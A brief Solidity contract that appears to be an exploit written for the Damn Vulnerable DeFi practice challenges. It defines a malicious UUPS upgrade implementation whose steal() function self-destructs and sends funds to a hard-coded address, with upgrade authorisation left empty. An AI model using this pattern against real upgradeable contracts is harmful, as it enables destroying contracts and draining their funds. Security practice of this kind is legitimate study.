// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "../DamnValuableToken.sol";

contract HackedAuthorizer is UUPSUpgradeable {
    function steal() public {
        selfdestruct(
            payable(address(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512))
        );
    }

    function _authorizeUpgrade(address imp) internal override {}
}
